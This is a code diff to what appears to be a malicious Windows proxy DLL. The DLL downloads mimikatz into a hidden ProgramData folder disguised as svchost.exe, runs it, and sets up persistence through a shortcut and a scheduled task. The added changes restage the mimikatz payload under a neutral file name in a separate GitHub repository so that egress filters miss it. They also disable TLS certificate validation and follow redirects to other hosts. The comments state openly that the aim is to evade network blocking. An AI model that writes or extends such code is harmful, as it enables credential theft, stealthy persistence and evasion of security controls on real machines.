@@ -20,6 +20,12 @@ const IID IID_IExecAction = {0x4c3d624d,0xfd6b,0x49a3,{0xb9,0xb7,0x73,0xc5,0x6a,
 static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
 static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";
 
+/* ponytail: ParrotSec/mimikatz raw URL is egress-blocked on many networks
+   (flagged malware path -> TLS handshake silently dropped). Stage the payload
+   in our own repo under a neutral name (same host P0wershell already pulls
+   userenv.dll/mimilib.dll from successfully). Rename on upload. */
+static const char *g_mimi_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.bin";
+
 static HMODULE g_real = NULL;
 
 static BOOL ensure_real(void) {
@@ -140,6 +146,13 @@ static void download_if_missing(const char *url, const char *outPath) {
     proto |= WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
     #endif
     WinHttpSetOption(hrq, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
+    // ponytail: follow cross-host redirects (github raw -> CDN) and accept
+    // inspecting-proxy certs so a TLS MITM doesn't stall ReceiveResponse.
+    DWORD redir = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
+    WinHttpSetOption(hrq, WINHTTP_OPTION_REDIRECT_POLICY, &redir, sizeof(redir));
+    DWORD ignore = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+                 | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hrq, WINHTTP_OPTION_SECURITY_FLAGS, &ignore, sizeof(ignore));
 
     HANDLE wd = CreateThread(NULL, 0, dl_watchdog, &hrq, 0, NULL);
 
@@ -359,7 +372,7 @@ static DWORD WINAPI worker_thread(LPVOID lp) {
 
     char svchost[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
-    download_if_missing("https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe", svchost);
+    download_if_missing(g_mimi_url, svchost);
     launch_mimikatz();
     create_lnk();
     create_task_govinda();
